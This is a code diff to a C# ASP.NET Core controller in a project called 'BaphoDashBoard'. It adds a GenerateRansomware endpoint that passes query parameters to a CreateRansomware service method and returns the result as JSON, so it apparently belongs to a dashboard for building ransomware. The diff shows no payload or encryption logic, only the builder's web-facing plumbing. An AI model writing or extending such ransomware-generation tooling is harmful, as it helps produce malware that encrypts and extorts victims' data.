@@ -8,6 +8,7 @@ using Microsoft.AspNetCore.Mvc;
 using System.Text;
 using BaphoDashBoard.DAL.Services;
 using BaphoDashBoard.VueModels;
+using BaphoDashBoard.DTO;
 
 namespace BaphoDashBoard.Controllers
 {
@@ -39,6 +40,21 @@ namespace BaphoDashBoard.Controllers
         public async Task<IActionResult> Delete([FromBody] int id)
         {
             var result = await _service.Delete(id);
+            return Json(result);
+        }
+
+        public async Task<IActionResult>GenerateRansomware([FromQuery] GenerateRansomwareDTO model)
+        {
+            AppResult result = new AppResult();
+            try
+            {
+                result = await _service.CreateRansomware(model);
+            }
+            catch(Exception ex)
+            {
+                result.success = false;
+                result.message = ex.Message;
+            }
             return Json(result);
         }
 
